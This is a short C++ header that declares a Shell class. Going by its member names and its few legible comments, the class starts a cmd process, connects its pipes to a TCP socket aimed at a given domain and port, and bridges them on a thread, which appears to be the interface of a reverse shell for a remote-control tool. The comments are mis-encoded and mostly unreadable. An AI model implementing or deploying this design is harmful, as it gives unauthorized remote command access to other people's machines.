// ����cmd���� ͨ���ܵ��������������
// �����ܵ���ͬ��socket��hunter��
// ʹ��hunter���ܹ���cmd���̽���
// ʹ�õ���ģʽ

#pragma once
#include <strsafe.h>
#include "TcpSocket.h"
#include <string>

class Shell
{
public:
	// ������ں��� ����cmd���̲����ùܵ����� �������߳�
	static void startShell(std::string domain, int port);
	// �̺߳��� ����ͨ�ܵ���socket
	static DWORD WINAPI threadProc(LPVOID args);
	// ����cmd�ӽ��̲�׼���ùܵ�
	static bool createCmd();
	// �����첽�׽���
	static bool setAsySocket(std::string domain, int port);
};

